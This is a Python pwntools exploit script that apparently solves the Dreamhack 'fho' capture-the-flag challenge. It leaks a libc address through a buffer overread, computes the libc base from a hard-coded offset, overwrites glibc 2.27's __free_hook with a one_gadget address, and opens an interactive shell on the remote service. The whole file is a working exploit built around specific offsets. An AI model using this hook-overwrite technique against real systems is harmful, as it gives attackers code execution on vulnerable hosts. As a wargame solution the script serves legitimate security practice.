#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host8.dreamhack.games", 10082)

input()
p.sendafter(b'Buf: ', b'a'*0x10)
p.recvuntil(b'a'*0x10)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x401b40
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

system = 0x4f550 + libc.address
og = [0x4f3ce, 0x4f3d5, 0x4f432, 0x10a41c]

p.sendlineafter(b'write: ', str(libc.sym['__free_hook']))
print(hex(libc.sym['__free_hook']))
p.sendlineafter(b'With: ', str(og[2] + libc.address))

p.interactive()
